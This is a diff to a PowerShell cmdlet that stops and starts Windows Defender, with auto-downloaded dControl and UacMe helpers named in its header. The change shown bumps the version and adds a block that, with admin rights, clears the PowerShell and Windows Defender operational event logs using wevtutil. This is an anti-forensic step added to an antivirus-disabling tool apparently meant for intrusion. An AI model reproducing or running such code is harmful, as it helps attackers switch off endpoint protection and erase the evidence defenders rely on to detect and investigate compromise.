@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19042) x64 bits
    Required Dependencies: Invoke-WebRequest {native}, dControl.zip {auto-download}
    Optional Dependencies: UacMe.ps1 {auto-download}
-   PS cmdlet Dev version: v2.2.6
+   PS cmdlet Dev version: v2.2.7
 
 .DESCRIPTION
    This CmdLet Query, Stops, Start Anti-Virus Windows Defender
@@ -314,6 +314,12 @@ If(Test-Path -Path "$Env:TMP\dControl.ini" -EA SilentlyContinue){
 }
 If(Test-Path -Path "$Env:TMP\dControl.exe" -EA SilentlyContinue){Start-Sleep -Seconds 3
    Remove-Item -Path "$Env:TMP\dControl.exe" -EA SilentlyContinue -Force
+}
+
+## Delete Windows-Defender logfiles
+If($IsClientAdmin -eq $True){
+   wevtutil cl "Microsoft-Windows-PowerShell/Operational"
+   wevtutil cl "Microsoft-Windows-Windows Defender/Operational"
 }
 
 exit
